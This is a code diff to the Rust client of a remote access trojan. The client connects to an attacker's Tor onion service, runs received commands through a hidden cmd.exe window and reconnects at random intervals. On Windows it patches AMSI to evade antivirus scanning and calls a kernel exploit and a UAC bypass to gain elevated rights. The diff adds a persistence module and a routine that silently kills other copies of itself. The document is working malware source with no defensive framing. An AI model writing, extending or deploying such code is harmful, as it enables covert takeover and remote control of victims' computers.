@@ -1,13 +1,13 @@
 #![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
+
 #[cfg(target_os = "windows")]
 mod uac_bypass;
 #[cfg(target_os = "windows")]
 mod amsi_patch;
 #[cfg(target_os = "windows")]
 mod kernel_exploit;
-
-
-
+#[cfg(target_os = "windows")]
+mod persist;
 
 use is_elevated::is_elevated;
 use std::env;
@@ -21,11 +21,40 @@ use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 use rand::Rng;
 
-// use crate::uac_bypass::generate_inf_file;
-//use artirat_client::netclient;
+#[cfg(target_os = "windows")]
+use std::os::windows::process::CommandExt;
 
+#[cfg(target_os = "windows")]
+const CREATE_NO_WINDOW: u32 = 0x08000000;
 
-/// Public configuration struct (so lib users can customize)
+#[cfg(target_os = "windows")]
+fn kill_other_instances() {
+    use std::process::{Command, Stdio};
+    use std::os::windows::process::CommandExt;
+
+    const CREATE_NO_WINDOW: u32 = 0x08000000;
+
+    if let Ok(exe) = std::env::current_exe() {
+        if let Some(name) = exe.file_name().and_then(|n| n.to_str()) {
+            let current_pid = std::process::id();
+
+            let _ = Command::new("cmd.exe")
+                .creation_flags(CREATE_NO_WINDOW)
+                .args([
+                    "/C",
+                    &format!(
+                        "for /f \"tokens=2\" %a in ('tasklist ^| findstr {}') do @if not %a=={} taskkill /PID %a /F",
+                        name, current_pid
+                    ),
+                ])
+                .stdout(Stdio::null())
+                .stderr(Stdio::null())
+                .spawn();
+        }
+    }
+}
+
+/// Public configuration struct
 #[derive(Clone, Debug)]
 pub struct ClientConfig {
     pub onion: String,
@@ -41,7 +70,7 @@ impl Default for ClientConfig {
     }
 }
 
-/// Initialize Tor client (exported for lib usage)
+/// Initialize Tor client
 async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     let config = TorClientConfig::default();
     let client = TorClient::create_bootstrapped(config).await?;
@@ -51,7 +80,6 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
 
 /// Build prompt string
 pub fn build_prompt() -> String {
-
     let user = std::env::var("USER")
         .or_else(|_| std::env::var("USERNAME"))
         .unwrap_or_else(|_| "unknown".into());
@@ -96,7 +124,6 @@ pub async fn run_command(input: &str) -> Result<Vec<u8>> {
                     return Ok(b"uac: missing argument\n".to_vec());
                 }
 
-                // preserve full command (important)
                 let payload = args.join(" ");
                 crate::uac_bypass::elevate_uac(&payload);
 
@@ -110,23 +137,16 @@ pub async fn run_command(input: &str) -> Result<Vec<u8>> {
         }
 
         "exit" | "quit" | "/quit" => {
-            // You can decide behavior here:
-            // Option 1: terminate process
             std::process::exit(0);
-
-            // Option 2 (if you prefer graceful handling):
-            // return Ok(b"exit\n".to_vec());
         }
 
         _ => {
-            // fallback: execute command normally
-
             #[cfg(target_os = "windows")]
             let mut command = {
                 let mut c = Command::new("cmd.exe");
                 c.arg("/C")
                     .arg(input)
-                    .creation_flags(0x08000000);
+                    .creation_flags(CREATE_NO_WINDOW);
                 c
             };
 
@@ -155,6 +175,7 @@ pub async fn run_command(input: &str) -> Result<Vec<u8>> {
         }
     }
 }
+
 /// Connect to onion service
 pub async fn connect_onion(
     tor_client: &TorClient<PreferredRuntime>,
@@ -207,7 +228,7 @@ pub async fn read_loop(stream: DataStream) -> Result<()> {
     Ok(())
 }
 
-/// Core runner (THIS is what you export for lib usage)
+/// Core runner
 pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     loop {
         println!("Attempting to connect...");
@@ -229,15 +250,14 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
             }
         }
 
-        let mut rng = rand::thread_rng();
-        let delay: u64 = rng.gen_range(19..=67);
+        let delay: u64 = rand::thread_rng().gen_range(19..=67);
 
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
 }
 
-/// Exportable async entrypoint for library users
+/// Entry point
 pub async fn netclient() -> Result<()> {
     #[cfg(target_os = "windows")]
     amsi_patch::amsi_patch();
@@ -250,14 +270,17 @@ pub async fn netclient() -> Result<()> {
 
     #[cfg(target_os = "windows")]
     if !is_elevated() {
-        //kernel_exploit::kernel_exploit();
         unsafe {
             kernel_exploit::exploit();
         }
-        uac_bypass::uac_slui(&exe_str);
-        // Make sure user session is the last one to connect, elevated prompt will execute first!
+        uac_bypass::elevate_uac(&exe_str);
+
         sleep(Duration::from_secs(61)).await;
-        return Ok(()); // early return = cleaner
+        return Ok(());
+    } else {
+        kill_other_instances();
+        persist::persist();
     }
+
     netclient_run(ClientConfig::default()).await
 }
